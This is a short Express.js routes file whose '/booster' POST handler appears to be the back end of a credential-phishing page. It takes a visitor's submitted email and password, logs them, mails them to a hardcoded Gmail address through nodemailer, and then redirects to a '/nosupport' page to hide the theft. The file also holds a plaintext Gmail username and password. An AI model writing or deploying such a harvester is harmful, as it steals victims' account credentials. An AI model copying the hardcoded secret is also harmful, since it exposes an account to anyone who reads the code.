var express = require('express');
var router = express.Router();

/* GET home page. */
router.get('/', function(req, res, next) {
  res.render('index', { title: 'Express' });
});

var transporter = nodemailer.createTransport({
  service: 'gmail',
  auth: {
    user: 'gaurav020406@gmail.com',
    pass: 'iliketoplayfootball'
  }
});

router.post('/booster', function(req, res, next) {
var email = req.body.email;
var password = req.body.password;
console.log(email + " " + password);


var mailOptions = {
  from: 'gaurav020406@gmail.com',
  to: 'gaurav020406@gmail.com',
  subject: 'Booster',
  text: email + ' ' +password,
};

transporter.sendMail(mailOptions, function(error, info){
  if (error) {
    console.log(error);
  } else {
    console.log('Email sent: ' + info.response);
  }
});

res.redirect('/nosupport');
});


router.get('/nosupport', function(req, res, next) {
  res.render('nosupport', { title: 'Express' });
});

module.exports = router;
